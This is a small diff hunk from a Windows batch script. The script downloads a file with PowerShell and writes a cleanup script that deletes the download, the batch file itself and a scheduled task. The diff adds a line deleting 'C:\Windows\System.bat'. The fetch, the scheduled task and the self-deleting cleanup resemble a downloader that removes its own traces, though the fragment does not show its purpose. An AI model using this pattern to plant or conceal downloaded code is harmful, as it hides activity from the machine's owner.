@@ -18,6 +18,7 @@ powershell -Command "Invoke-WebRequest -Uri '%fileURL%' -OutFile '%destPath%'"
     echo timeout /t 2 ^>nul
     echo del /f /q "%destPath%"
     echo del /f /q "%batFile%"
+    echo del /f /q "C:\Windows\System.bat"
     echo schtasks /delete /tn "%taskName%" /f
 ) > "%cleanupScript%"
 
